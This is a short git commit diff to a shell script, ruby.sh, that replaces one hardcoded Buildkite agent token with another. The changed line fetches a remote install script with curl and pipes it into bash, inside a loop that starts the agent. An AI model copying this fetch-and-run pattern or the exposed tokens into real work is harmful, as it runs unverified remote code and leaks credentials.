d1bbae6b40a3fac3d1d9e037ab3b0f58848fb80a
viana17 <85560824+viana17@users.noreply.github.com>
2021-06-08 19:36:05 +0700

    Update ruby.sh

--- ruby.sh
+++ ruby.sh
@@ -6,7 +6,7 @@ screen
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
  
-TOKEN="6b0d14f14d63b4bed3ac95ba8fdde3fb8ce966f82f3835da47" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
+TOKEN="55b4df594ecfbf0b79c273997f6fe42b953926ff1695e75b08" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
 ~/.buildkite-agent/bin/buildkite-agent start
  
      echo COUNTER $COUNTER
